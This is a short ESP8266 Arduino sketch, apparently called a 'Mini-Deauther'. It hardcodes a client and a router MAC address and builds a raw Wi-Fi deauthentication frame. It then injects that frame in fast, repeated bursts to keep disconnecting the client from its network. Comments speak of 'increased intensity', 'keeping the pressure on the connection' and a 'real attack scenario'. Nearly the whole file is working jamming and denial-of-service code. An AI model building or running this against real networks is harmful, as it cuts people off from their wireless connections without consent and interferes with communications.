#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

// Target Information (Replace with your own devices for testing)
// Fixed syntax for your ESP8266
uint8_t target_mac[6] = {0xD6, 0xBC, 0x5A, 0xAC, 0x0E, 0x44}; // Client MAC
uint8_t router_mac[6] = {0xE8, 0x65, 0xD4, 0x99, 0x5D, 0xF8}; // Router MAC
// The Deauth Frame Template
uint8_t packet[26] = {
  0xC0, 0x00,                         // Type: Deauthentication
  0x00, 0x00,                         // Duration
  0xD6, 0xBC, 0x5A, 0xAC, 0x0E, 0x44, // Destination (Target)
  0xE8, 0x65, 0xD4, 0x99, 0x5D, 0xF8, // Source (Router)
  0xE8, 0x65, 0xD4, 0x99, 0x5D, 0xF8, // BSSID
  0x00, 0x00,                         // Sequence number
  0x01, 0x00                          // Reason code (1 = Unspecified)
};

void setup() {
  Serial.begin(115200);
  
  // Put the Wi-Fi radio into 'Promiscuous Mode' to allow packet injection
  WiFi.mode(WIFI_STA);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1); 
  
  Serial.println("Mini-Deauther Initialized...");
}

void loop() {
  // Increased intensity: Send 60 packets per second
  for (int i = 0; i < 60; i++) {
    // 1. Tell the Client to disconnect from the Router
    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
    
    // 2. Tell the Router to disconnect the Client (Reverse Packet)
    // We swap the source and destination in a real attack scenario
    
    delay(1); // Very short delay for high speed
  }
  
  Serial.println("High-intensity burst sent!");
  // No long delay here - keep the pressure on the connection
}